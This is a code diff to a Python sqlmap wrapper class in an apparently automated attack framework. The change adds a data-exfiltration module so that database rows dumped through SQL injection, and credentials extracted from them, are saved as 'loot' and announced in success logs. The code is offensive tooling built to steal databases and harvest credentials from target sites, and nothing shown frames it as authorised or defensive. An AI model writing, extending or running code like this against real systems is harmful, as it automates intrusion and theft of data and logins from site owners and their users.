@@ -6,6 +6,7 @@ from typing import Optional, Dict, List, Any
 from core.base_agent import BaseAgent
 from core.data_models import Strategy, SQLInjectionFinding, AttackPhase, AgentData
 from core.logger import log
+from core.data_exfiltration import DataExfiltrator
 
 
 class SqlmapAgent(BaseAgent):
@@ -29,6 +30,7 @@ class SqlmapAgent(BaseAgent):
         self.sqlmap_path = self._find_sqlmap()
         self.results_dir = "/home/ubuntu/dlnk/workspace/loot/sqlmap"
         os.makedirs(self.results_dir, exist_ok=True)
+        self.exfiltrator = DataExfiltrator(workspace_dir="/home/ubuntu/dlnk/workspace")
 
     def _find_sqlmap(self) -> str:
         """หา sqlmap binary"""
@@ -259,6 +261,23 @@ class SqlmapAgent(BaseAgent):
         dumped_data = self._parse_dump(output)
         credentials = self._extract_credentials(output)
         
+        # Exfiltrate database dump
+        db_loot = None
+        if len(dumped_data) > 0:
+            db_loot = await self.exfiltrator.exfiltrate_database(
+                target=url,
+                db_type="mysql",
+                data=output.encode('utf-8')
+            )
+        
+        # Exfiltrate credentials
+        cred_loot = None
+        if credentials:
+            cred_loot = await self.exfiltrator.exfiltrate_credentials(
+                target=url,
+                credentials=credentials
+            )
+        
         result = {
             "success": len(dumped_data) > 0,
             "database": database,
@@ -266,12 +285,20 @@ class SqlmapAgent(BaseAgent):
             "dumped_rows": len(dumped_data),
             "data": dumped_data[:100],  # First 100 rows
             "credentials": credentials,
-            "output_file": self._save_output(url, f"dump_{database}_{table}", output)
+            "output_file": self._save_output(url, f"dump_{database}_{table}", output),
+            "loot": {
+                "database_dump": db_loot,
+                "credentials": cred_loot
+            }
         }
         
         log.success(f"[SQLMapAgent] Dumped {len(dumped_data)} rows")
         if credentials:
             log.success(f"[SQLMapAgent] Found {len(credentials)} credentials!")
+        if db_loot:
+            log.success(f"[SQLMapAgent] Database dump saved to: {db_loot['file']}")
+        if cred_loot:
+            log.success(f"[SQLMapAgent] Credentials saved to: {cred_loot['file']}")
         
         return result
 
